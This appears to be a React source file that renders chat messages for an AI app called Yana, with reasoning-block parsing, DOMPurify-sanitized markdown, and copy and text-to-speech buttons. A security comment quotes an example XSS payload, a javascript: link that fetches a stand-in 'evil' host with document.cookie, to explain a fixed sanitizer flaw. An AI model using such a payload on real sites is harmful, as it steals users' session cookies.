// Yana AI — Chat message rendering: markdown, thinking blocks, copy/speak,
// and the Message bubble itself.
import React from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js';
import { L, Icons } from '../../components.jsx';
import { RouteChip } from './badges.jsx';
import { UserMessage } from './user-message.jsx';

// Parse <think>...</think> blocks out of model output.
// Returns { display: string, reasoning: string|null }
export function parseThink(text) {
  if (!text) return { display: text, reasoning: null };
  const thinkRe = /<think>([\s\S]*?)<\/think>/gi;
  const blocks = [];
  let display = text.replace(thinkRe, (_, inner) => { blocks.push(inner.trim()); return ""; }).trim();
  // Also catch unclosed <think> at the start (streaming mid-thought)
  if (!blocks.length) {
    const unclosed = text.match(/^<think>([\s\S]*)$/i);
    if (unclosed) return { display: "", reasoning: unclosed[1].trim() };
  }
  return { display, reasoning: blocks.length ? blocks.join("\n\n---\n\n") : null };
}

export function ThinkToggle({ reasoning }) {
  const [open, setOpen] = React.useState(() => localStorage.getItem("yana.dev.expand-thinking") === "true");
  return (
    <div style={{ marginBottom: 6 }}>
      <button onClick={() => setOpen((o) => !o)} style={{
        display: "inline-flex", alignItems: "center", gap: 5,
        background: "none", border: "1px solid var(--border)", borderRadius: 99,
        padding: "3px 10px", fontSize: 11.5, color: "var(--ink-3)", cursor: "pointer",
        fontFamily: "inherit",
      }}>
        <span style={{ fontSize: 13 }}>🧠</span>
        {open ? L("Hide reasoning", "Ẩn suy nghĩ", "추론 숨기기", "隐藏推理过程") : L("Show reasoning", "Xem suy nghĩ", "추론 보기", "显示推理过程")}
        <span style={{ transform: open ? "rotate(180deg)" : "none", transition: "transform .15s", display: "inline-block" }}>▾</span>
      </button>
      {open && (
        <div style={{
          marginTop: 8, padding: "10px 12px", borderRadius: "var(--r-md)",
          background: "rgba(var(--shadow-rgb), 0.04)", border: "1px solid var(--border)",
          fontSize: 12.5, lineHeight: 1.6, color: "var(--ink-3)",
          whiteSpace: "pre-wrap", maxHeight: 260, overflowY: "auto",
        }}>{reasoning}</div>
      )}
    </div>
  );
}

// ── Markdown rendering ─────────────────────────────────────────────────────────
// SECURITY (found in review, 2026-08-11): this used to be a hand-rolled
// regex ("safeHtml") that stripped <script> tags and on*= event-handler
// attributes but never touched href/src URL schemes — a markdown link like
// [click](javascript:fetch('https://evil/'+document.cookie)) rendered
// straight through into dangerouslySetInnerHTML untouched. Per this repo's
// own owasp-llm-output-law.md (LLM02: sanitize LLM/markdown output before
// render — DOMPurify, not a regex), replaced with real sanitization.
// DOMPurify blocks javascript:/vbscript:/data:-for-non-image URLs in
// href/src by default; no extra config needed for that part.
export function safeHtml(html) {
  return DOMPurify.sanitize(html);
}
export function renderMd(text) {
  if (!text) return "";
  try {
    marked.use({ gfm: true, breaks: true });
    return safeHtml(marked.parse(text));
  } catch (_) { return text.replace(/\n/g,"<br>"); }
}
// Shared clipboard-copy logic for the whole-message CopyBtn and the
// per-code-block buttons MarkdownBubble injects — one clipboard call site.
function copyToClipboard(text, onDone) {
  navigator.clipboard.writeText(text).then(() => {
    onDone(true);
    setTimeout(() => onDone(false), 1800);
  }).catch(() => {});
}

// Injects one copy button per <pre> block (skips ones already wired) —
// imperative DOM, matching the existing hljs.highlightElement walk below,
// since this content came in via dangerouslySetInnerHTML rather than JSX.
function attachCodeCopyButtons(container) {
  container.querySelectorAll("pre:not([data-copy-btn])").forEach((pre) => {
    pre.setAttribute("data-copy-btn", "1");
    const code = pre.querySelector("code");
    if (!code) return;
    const btn = document.createElement("button");
    btn.className = "code-copy-btn";
    btn.type = "button";
    btn.title = L("Copy", "Sao chép", "복사", "复制");
    btn.textContent = "⧉";
    btn.onclick = () => {
      copyToClipboard(code.innerText, (copied) => {
        btn.textContent = copied ? "✓" : "⧉";
      });
    };
    pre.appendChild(btn);
  });
}

export function MarkdownBubble({ text }) {
  const ref = React.useRef(null);
  React.useEffect(() => {
    const el = ref.current;
    if (!el) return;
    el.querySelectorAll("pre code:not([data-highlighted])").forEach(b => hljs.highlightElement(b));
    attachCodeCopyButtons(el);
  });
  return <div ref={ref} className="yana-md" dangerouslySetInnerHTML={{ __html: renderMd(text) }} />;
}
export function CopyBtn({ text }) {
  const [copied, setCopied] = React.useState(false);
  return (
    <button onClick={() => copyToClipboard(text, setCopied)} className="copy-btn" title={L("Copy", "Sao chép", "복사", "复制")} style={{
      width: 24, height: 24, borderRadius: 6,
      border: "1px solid var(--border)", background: "rgba(var(--surface-rgb,255,255,255),.7)",
      cursor: "pointer", fontSize: 11, display: "grid", placeItems: "center",
      color: copied ? "var(--primary)" : "var(--ink-3)", flexShrink: 0,
    }}>
      {copied ? "✓" : "⧉"}
    </button>
  );
}

// Read-aloud button — POSTs to the local VieNeu-TTS sidecar via /api/tts and
// plays the returned WAV. States: idle (🔊) / loading (spinner) / playing
// (⏹, click to stop) / error (⚠, reverts to idle after a beat). The sidecar
// is an opt-in local process (tools/yana-web/tts-sidecar/), so "not running"
// is an expected, common state, not a bug — the error tooltip says so.
export function SpeakBtn({ text }) {
  const [state, setState] = React.useState("idle"); // idle | loading | playing | error
  const audioRef = React.useRef(null);

  React.useEffect(() => () => { audioRef.current?.pause(); }, []);

  function stop() {
    audioRef.current?.pause();
    audioRef.current = null;
    setState("idle");
  }

  async function speak() {
    if (state === "playing") { stop(); return; }
    if (state === "loading") return;
    setState("loading");
    try {
      const res = await fetch("/api/tts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text }),
      });
      if (!res.ok) throw new Error(await res.text().catch(() => "TTS failed"));
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const audio = new Audio(url);
      audioRef.current = audio;
      audio.onended = () => { URL.revokeObjectURL(url); setState("idle"); };
      audio.onerror = () => { URL.revokeObjectURL(url); setState("error"); setTimeout(() => setState("idle"), 2200); };
      await audio.play();
      setState("playing");
    } catch (_) {
      setState("error");
      setTimeout(() => setState("idle"), 2200);
    }
  }

  const glyph = state === "loading" ? "…" : state === "playing" ? "⏹" : state === "error" ? "⚠" : "🔊";
  const title = state === "error"
    ? L("TTS sidecar not running", "Sidecar TTS chưa chạy", "TTS 사이드카 미실행", "TTS 边车未运行")
    : L("Read aloud", "Đọc", "읽어주기", "朗读");

  return (
    <button onClick={speak} className="copy-btn" title={title} disabled={state === "loading"} style={{
      width: 24, height: 24, borderRadius: 6,
      border: "1px solid var(--border)", background: "rgba(var(--surface-rgb,255,255,255),.7)",
      cursor: state === "loading" ? "wait" : "pointer", fontSize: 11, display: "grid", placeItems: "center",
      color: state === "playing" ? "var(--primary)" : state === "error" ? "var(--color-destructive)" : "var(--ink-3)",
      flexShrink: 0, opacity: state === "loading" ? .6 : 1,
    }}>
      {glyph}
    </button>
  );
}

export function Message({ msg, msgIndex, isLastYana, onRegenerate, onEdit }) {
  const devMode = localStorage.getItem("yana.dev.mode") === "true";
  if (msg.who === "user") {
    return <UserMessage msg={msg} msgIndex={msgIndex} onEdit={onEdit} />;
  }
  if (msg.isHtml) {
    return (
      <div className="msg-in" style={{ display: "flex", justifyContent: "flex-start" }}>
        <div style={{ maxWidth: "82%" }}>
          {msg.route && <RouteChip route={msg.route} />}
          <div className="glass" style={{ padding: "12px 16px", borderRadius: "4px 16px 16px 16px", display: "flex", alignItems: "center", gap: 12 }}>
            <span style={{ fontSize: 20, flex: "none" }}>🎨</span>
            <div>
              <div style={{ fontSize: 13.5, fontWeight: 500, color: "var(--ink)" }}>{L("HTML generated", "Đã tạo HTML", "HTML 생성됨", "已生成 HTML")}</div>
              <div style={{ fontSize: 12, color: "var(--ink-3)", marginTop: 2 }}>{L("Preview visible on the right →", "Xem preview bên phải →", "오른쪽에서 미리보기 →", "预览显示在右侧 →")}</div>
            </div>
          </div>
        </div>
      </div>
    );
  }
  const parsed = parseThink(msg.text);
  const displayText = parsed.display || "";
  return (
    <div className="msg-in msg-wrap" style={{ display: "flex", justifyContent: "flex-start" }}>
      <div style={{ maxWidth: "82%" }}>
        {msg.route && <RouteChip route={msg.route} />}
        {parsed.reasoning && <ThinkToggle reasoning={parsed.reasoning} />}
        <div className="glass" style={{ padding: "12px 16px", borderRadius: "4px 16px 16px 16px", fontSize: 13.8, lineHeight: 1.6, color: "var(--ink)" }}>
          {displayText
            ? <MarkdownBubble text={displayText} />
            : parsed.reasoning
              ? <span style={{ color: "var(--ink-3)", fontStyle: "italic" }}>{L("Reasoning…", "Đang suy nghĩ…", "추론 중…", "推理中…")}</span>
              : ""}
          {msg.action && (
            <div style={{
              marginTop: 11, padding: "9px 12px", borderRadius: "var(--r-sm)",
              background: "var(--primary-soft)", display: "flex", alignItems: "center", gap: 9,
            }}>
              <span style={{ color: "var(--primary)" }}>{Icons.safety(15)}</span>
              <div style={{ lineHeight: 1.3 }}>
                <div style={{ fontSize: 12.5, fontWeight: 500, color: "var(--primary)" }}>{msg.action.label}</div>
                <div style={{ fontSize: 11.5, color: "var(--ink-3)" }}>{msg.action.state}</div>
              </div>
            </div>
          )}
        </div>
        {msg.refs && (
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginTop: 7 }}>
            {msg.refs.map((r) => <span key={r} className="chip neutral" style={{ fontSize: 11 }}>{r}</span>)}
          </div>
        )}
        {/* copy + regenerate row */}
        <div style={{ display: "flex", alignItems: "center", gap: 5, marginTop: 4 }}>
          {displayText && <CopyBtn text={displayText} />}
          {displayText && <SpeakBtn text={displayText} />}
          {isLastYana && onRegenerate && (
            <button onClick={onRegenerate} className="copy-btn" title={L("Regenerate", "Thử lại", "다시 생성", "重新生成")} style={{
              height: 24, padding: "0 8px", borderRadius: 6,
              border: "1px solid var(--border)", background: "rgba(var(--surface-rgb,255,255,255),.7)",
              cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4,
              color: "var(--ink-3)", flexShrink: 0,
            }}>↺ {L("Retry", "Thử lại", "재시도", "重试")}</button>
          )}
        </div>
        {/* dev stats bar — visible only in Developer Mode */}
        {devMode && msg.route?._streamDone && (() => {
          const { secs, chars } = msg.route._streamDone;
          return (
            <div style={{
              display: "flex", alignItems: "center", gap: 7, marginTop: 4,
              fontSize: 10.5, color: "var(--ink-3)", fontFamily: "ui-monospace,'SF Mono',Menlo,monospace",
            }}>
              <span title={L("Response time", "Thời gian phản hồi", "응답 시간", "响应时间")}>⏱ {secs.toFixed(1)}s</span>
              <span style={{ opacity: .4 }}>·</span>
              <span title={L("Estimated tokens (1 tok ≈ 4 chars)", "Ước lượng token (1 tok ≈ 4 ký tự)", "예상 토큰 수 (1 tok ≈ 4자)", "预估 token 数（1 tok ≈ 4 字符）")}>~{Math.round(chars / 4)} tok</span>
              <span style={{ opacity: .4 }}>·</span>
              <span title={L("Characters per second", "Ký tự/giây", "초당 문자 수", "每秒字符数")}>{Math.round(chars / Math.max(secs, 0.1))} ch/s</span>
              {msg.route.agent && (
                <>
                  <span style={{ opacity: .4 }}>·</span>
                  <span style={{ maxWidth: 120, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{msg.route.agent}</span>
                </>
              )}
            </div>
          );
        })()}
      </div>
    </div>
  );
}
